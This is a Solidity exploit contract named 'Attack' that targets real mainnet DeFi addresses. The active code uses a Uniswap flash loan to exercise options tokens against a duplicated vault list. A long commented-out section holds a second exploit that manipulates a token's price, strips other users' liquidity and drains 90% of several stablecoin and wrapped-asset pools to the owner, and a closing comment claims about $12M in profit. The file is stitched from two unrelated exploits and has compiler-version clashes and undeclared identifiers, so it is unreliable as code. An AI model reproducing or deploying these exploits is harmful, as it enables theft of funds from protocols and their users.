// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./IUniswap.sol";

contract IoToken {
    function exercise(uint256 oTokensToExercise, address payable[] memory vaultsToExerciseFrom) public payable;
    function addERC20CollateralOption(uint256 amtToCreate, uint256 amtCollateral, address receiver) public;
    function removeUnderlying() public;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract Attack {

    address owner;
    address constant USDC_ADDR = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant OTOKEN_ADDR = 0x951D51bAeFb72319d9FBE941E1615938d89ABfe2;
    address constant USDC_ETH_PAIR = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;

    constructor () public payable {
        owner = msg.sender;
    }


    function exploit() public {
        uint256 usdcToAdd = 24750 * 1e6;
        uint256 ethToAdd = address(this).balance;

        // Flash loan 24.750 USDC
        bytes memory data = "0";
        IUniswapV2Pair(USDC_ETH_PAIR).swap(usdcToAdd, 0, address(this), data);
    }

    // Called after the uniswap flash loan is received
    function uniswapV2Call(address, uint amount0, uint amount1, bytes calldata) external {
        uint256 usdcToAdd = (amount0 == 0) ? amount1 : amount0;
        uint256 oTokensToGet = 150 * 1e7;

        IoToken(OTOKEN_ADDR).addERC20CollateralOption(oTokensToGet, usdcToAdd, address(this));

        address payable [] memory vaults = new address payable [] (2);
        vaults[0] = address(uint160(address(this)));
        vaults[1] = address(uint160(address(this)));
        IoToken(OTOKEN_ADDR).exercise{value:address(this).balance}(oTokensToGet, vaults);

        IoToken(OTOKEN_ADDR).removeUnderlying();

        // Repay flash loan of 24.750 USDC
        uint256 usdcToReturn = usdcToAdd * 1000 / 997 + 1;
        IERC20(USDC_ADDR).transfer(USDC_ETH_PAIR, usdcToReturn);
    }

/*
    // Receive ETH and convert to WETH
    function fund() public payable {
        IWETH(WETH_ADDR).deposit{value : msg.value}();
    }

    function getTokenBalanceAndPrice() public view returns (uint256, uint256) {
        (,,,,,,uint112 tokenBalance, uint256 price,) = ms.pools(MONO_TOKEN_ADDR);
        return (uint256(tokenBalance), price);
    }

    // Pump the price of MONO by doing `loops` consecutive MONO-MONO swaps
    function manipulatePrice(uint256 loops) internal {
        uint256 tokenBalance;
        uint256 price;

        (, price) = getTokenBalanceAndPrice();
        console.log("[manipulatePrice] Initial MONO price: %s", price);

        IERC20(MONO_TOKEN_ADDR).approve(MS_PROXY_ADDR, type(uint256).max);

        for (uint256 i=0; i < loops; i++) {
            (tokenBalance,) = getTokenBalanceAndPrice();
            ms.swapExactTokenForToken(MONO_TOKEN_ADDR, MONO_TOKEN_ADDR, 
                tokenBalance-1, 0, address(this), block.timestamp + 120);
        }

        (, price) = getTokenBalanceAndPrice();
        console.log("[manipulatePrice] Final MONO price: %s", price);
    }

    // Remove Liquidity and then Add again -> Allows for faster price manipulation
    function manipulateLiquidity() internal {
        uint256 tokenBalance;
        (tokenBalance,) = getTokenBalanceAndPrice();
        console.log("[manipulateLiquidity] Initial MONO TokenBalance: %s", tokenBalance);

        // Remove
        uint256 id = 10;  // MONO pool identifier
        address monoXPool = 0x59653E37F8c491C3Be36e5DD4D503Ca32B5ab2f4; // (proxy)
        address[] memory addrToRmLiq = new address[](3);
        addrToRmLiq[0] = 0x7B9aa6ED8B514C86bA819B99897b69b608293fFC;
        addrToRmLiq[1] = 0x81D98c8fdA0410ee3e9D7586cB949cD19FA4cf38;
        addrToRmLiq[2] = 0xab5167e8cC36A3a91Fd2d75C6147140cd1837355;

        for (uint256 i=0; i < addrToRmLiq.length; i++) {
            uint256 balance = IMonoXPool(monoXPool).balanceOf(addrToRmLiq[i], id);
            ms.removeLiquidity(MONO_TOKEN_ADDR, balance, addrToRmLiq[i], 0, 1);
        }

        // Add
        uint256 liqToAdd = 196 * 1e6;
        IERC20(MONO_TOKEN_ADDR).approve(MS_PROXY_ADDR, type(uint256).max);
        ms.addLiquidity(MONO_TOKEN_ADDR, liqToAdd, address(this));

        (tokenBalance,) = getTokenBalanceAndPrice();
        console.log("[manipulateLiquidity] Final MONO TokenBalance: %s", tokenBalance);
    }

    // Swap WETH for MONO
    function getMonoTokens() internal {
        IERC20(WETH_ADDR).approve(MS_PROXY_ADDR, type(uint256).max);
        uint256 wethBalance = IERC20(WETH_ADDR).balanceOf(address(this));
        ms.swapExactTokenForToken(WETH_ADDR, MONO_TOKEN_ADDR, wethBalance, 1, address(this), block.timestamp + 120);

        uint256 monoBalance = IERC20(MONO_TOKEN_ADDR).balanceOf(address(this));
        console.log("[ATK] MONO Balance is: ", monoBalance);

    }

    function exploit() public {
        // 1) Get MONO tokens by swapping WETH
        getMonoTokens();

        // 2) Remove and then Add liquidity (allows for faster price manipulation)
        manipulateLiquidity();

        // 3) Pump the price via MONO-MONO swaps
        uint256 numSwaps = 55;
        manipulatePrice(numSwaps);

        // 4) Swap MONO for Stablecoins
        swapForStable();
    }

    function swapForStable() internal {
        address[] memory coins = new address[](4);
        coins[0] = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;  // USDC
        coins[1] = 0xdAC17F958D2ee523a2206206994597C13D831ec7;  // USDT
        coins[2] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;  // WETH
        coins[3] = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;  // WBTC

        // Drain 90% of the pools
        for (uint256 i=0; i < coins.length; i++) {
            uint256 monoBalance = IERC20(MONO_TOKEN_ADDR).balanceOf(address(this));
            (,,,,,,uint256 tokenBalance,,) = ms.pools(coins[i]);
            ms.swapTokenForExactToken(MONO_TOKEN_ADDR, coins[i], 
                    monoBalance, tokenBalance * 9 / 10, address(this), block.timestamp + 120);
        }
    }

    function sendProfitToOwner() public {
        address[] memory coins = new address[](4);
        coins[0] = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;  // USDC
        coins[1] = 0xdAC17F958D2ee523a2206206994597C13D831ec7;  // USDT
        coins[2] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;  // WETH
        coins[3] = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;  // WBTC

        for (uint256 i=0; i < coins.length; i++) {
            uint256 balance = IERC20(coins[i]).balanceOf(address(this));
            IERC20(coins[i]).safeTransfer(owner, balance);
        }
    }

    // Required for the `ms.addLiquidity` operation, which mints MONO LP tokens 
    function onERC1155Received(address _operator, address _from, uint256 _id, uint256 _value, bytes calldata _data) external returns(bytes4) {
        return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
    }

    function onERC1155BatchReceived(address _operator, address _from, uint256[] calldata _ids, uint256[] calldata _values, bytes calldata _data) external returns(bytes4) {
        return bytes4(keccak256("onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)"));
    }

    function checkBalance(address addr) public view {
        console.log("-----------------------");
        uint256 balance;
        balance = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48).balanceOf(addr);
        console.log("[%s] USDC Balance is: %s", addr, balance);
        balance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(addr);
        console.log("[%s] USDT Balance is: %s", addr, balance);
        balance = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).balanceOf(addr);
        console.log("[%s] WETH Balance is: %s", addr, balance);
        balance = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599).balanceOf(addr);
        console.log("[%s] WBTC Balance is: %s", addr, balance);
    }
*/
}


// Profit
// ---------------------
// USDC: 3.637.289,379370
// USDT: 4.085.066,930324
// WETH: 408,867833291508515478
// WBTC: 19,34417113
// -- Around $12M total